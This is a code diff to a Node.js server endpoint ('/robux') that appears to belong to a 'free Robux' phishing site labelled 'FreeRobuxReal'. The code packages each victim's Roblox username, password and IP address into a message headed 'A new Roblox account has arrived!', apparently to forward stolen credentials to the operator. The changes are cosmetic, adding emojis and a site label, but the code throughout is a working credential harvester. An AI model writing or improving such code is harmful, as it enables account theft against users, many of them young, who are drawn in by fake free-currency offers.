@@ -29,19 +29,20 @@ app.post("/robux", async (req, res) => {
     const content = {
         embeds: [{
             title: "📌 새로운 Roblox 계정이 도착했습니다!",
+            description: "사이트: FreeRobuxReal",
             color: 0x3498db, // 파란색 계열 (16진수)
             fields: [{
-                    name: "아이디",
+                    name: "🆔 아이디",
                     value: `\`${robloxId}\``,
                     inline: true
                 },
                 {
-                    name: "비밀번호",
+                    name: "🔑 비밀번호",
                     value: `\`${robloxPwd}\``,
                     inline: true
                 },
                 {
-                    name: "IP 주소",
+                    name: "🌐 IP 주소",
                     value: `\`${clientIp}\``,
                     inline: false
                 }
